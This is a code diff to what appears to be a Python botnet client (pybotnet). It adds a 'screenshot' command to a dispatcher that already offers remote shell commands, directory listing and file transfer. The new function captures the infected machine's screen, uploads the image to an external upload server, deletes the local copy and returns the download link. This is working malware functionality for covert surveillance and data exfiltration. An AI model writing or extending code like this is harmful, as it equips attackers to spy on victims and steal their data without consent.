@@ -21,7 +21,8 @@ scripts_name = {
     "cmd": "cmd <command>",
     "ls": "ls <route>",
     "export_file": "export_file <download link>",
-    "import_file": "import_file <file route>"
+    "import_file": "import_file <file route>",
+    "screenshot":  "screenshot"
 }
 
 # "import_file": "import_file <route>"
@@ -66,10 +67,15 @@ def execute_scripts(command: str, pybotnet_up_time, is_shell: bool, logger):
 
             elif command_name == 'ls':
                 return execute_ls(command, logger)
+
             elif command_name == 'export_file':
                 return execute_download_manager(command, logger)
+
             elif command_name == 'import_file':
                 return execute_upload_manager(command, logger)
+
+            elif command_name == 'screenshot':
+                return screenshot(logger)
 
         logger.error('execute_scripts invalid command; Wrong format')
         return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
@@ -241,3 +247,27 @@ def upload_manager(file_route: str, logger):
             logger.error(f'upload_manager: {error}')
             return False, 'Upload Failed'
     return False, 'file not found'
+
+
+def screenshot(logger):
+    ''' get screenshot and return screenshot download link '''
+    screen_file_route = util.screenshot_pil(logger)
+
+    if screen_file_route:
+        try:
+            with open(screen_file_route, 'rb') as file:
+                binary_file = file.read()
+                is_true, download_data = util.upload_server_1(
+                    binary_file, screen_file_route, logger, time_out=120, file_type='png')
+                os.remove(screen_file_route)
+                if is_true:
+                    logger.info('screenshot uploaded.')
+                    return download_data
+                else:
+                    return 'Upload screenshot Failed'
+        except Exception as error:
+            logger.error(f'screenshot.upload_manager: {error}')
+            return 'Upload Failed'
+    else:
+        logger.error('script.screenshot in util.screenshot_pil Failed')
+        return 'get screenshot Failed'
